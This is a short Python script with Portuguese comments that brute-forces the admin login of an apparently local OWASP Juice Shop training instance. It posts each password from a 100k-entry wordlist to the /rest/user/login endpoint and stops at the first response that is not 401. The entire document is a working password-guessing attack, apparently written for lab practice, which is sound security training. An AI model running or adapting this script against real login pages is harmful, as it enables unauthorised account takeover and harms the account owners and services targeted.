import requests

# Corrigido o caminho do arquivo (worldlists -> wordlists, se aplicável)
with open("./worldlists/100k.txt") as file:
  passwords = file.readlines()

for password in passwords:
  password = password.strip()
  data = {"email": "admin@juice-sh.op", "password": password}
  
  # CORREÇÃO 1: Alterado para o endpoint da API (/rest/user/login)
  response = requests.post("http://127.0.0.1:3000/rest/user/login", json=data)
  
  code = response.status_code
  
  print(f"SENHA ATUAL: {password}")

  if code != 401:
    # CORREÇÃO 2: Ajustada a sintaxe do print
    print(f"PASSWORD ENCONTRADA: {password} (Status: {code})")
    break